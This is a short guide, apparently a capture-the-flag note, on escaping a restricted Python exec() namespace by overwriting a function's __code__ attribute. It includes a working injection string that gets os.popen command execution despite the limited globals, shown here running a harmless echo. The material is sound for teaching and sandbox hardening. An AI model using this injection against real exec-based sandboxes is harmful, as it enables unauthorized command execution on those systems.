*2022-05-15*

#guide 

> [!Abstract]
>The `__code__` attribute of a Python function can be overwritten, allowing us to possibly break out of a constrained namespace and use an elevated one.

---

We can view all the attributes of an object using `print(func.__dir__())`. We'll be able to see a `__code__` attribute.

```python
Python 3.10.4 (main, Mar 23 2022, 23:05:40) [GCC 11.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> print(print.__dir__())  
['__repr__', '__hash__', '__call__', '__getattribute__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__reduce__', '__module__', '__doc__', '__name__', '__qualname__', '__self__', '__text_signature__', '__new__',  
'__str__', '__setattr__', '__delattr__', '__init__', '__reduce_ex__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
```

We can overwrite this attribute with the code of another function or a lambda. Lambdas are generally easier when working with injections.

## Example
```python
def func1():
	print(1)

func1()

func1.__code__ = (lambda: print(2)).__code__

func1()
```

```
1
2
```

## Namespace Escalation
We can use this property to escalate to a namespace with more functions available. Consider the following `exec()` injection with a limited namespace.

> [!Note]
> Notice that the globals available to use in the `exec()` function have been limited. In this case, only `print()`` can be called.

#### Failed Exploit
```python
import os 

def new_print(x):
	print(f"new print {x}")

builtins = {
	"print": new_print
}  

injection = "print(os.popen('whoami').read())"

exec(f"{injection}", builtins)
```

```shell
Traceback (most recent call last):
  File "/home/james/htb/amidst-us/namespace.py", line 13, in <module>
    exec(f"{injection}", builtins)
  File "<string>", line 1, in <module>
NameError: name 'os' is not defined
```

We get the error that the `os` module is not defined, which make sense since it is not included in the restricted namespace of the `exec`.

Now, lets try the same code with a different injection. This time we're going to overwrite the `__code__` attribute of `print` with that of a custom lambda. We'll then run `print()`.

#### Working Exploit
```python
import os 

def new_print(x):
	print(f"new print {x}")

builtins = {
	"print": new_print
}  

injection = "print.__code__ = (lambda: print(os.popen('echo EXPLOITED!').read())).__code__; print()"

exec(f"{injection}", builtins)
```

```
EXPLOITED!
```

> [!Success]
> The `print` function's code is being overwritten with that of our own lambda, but instead of using the constrained namespace of the `exec`, it's using the namespace of `new_print` which has access to the `os` module and all the default Python built-ins. 

With this change, `print(os.popen('echo EXPLOITED!').read())` is running as if it's not in the constrained namespace.

---

# References
* https://stackoverflow.com/questions/6886493/get-all-object-attributes-in-python

---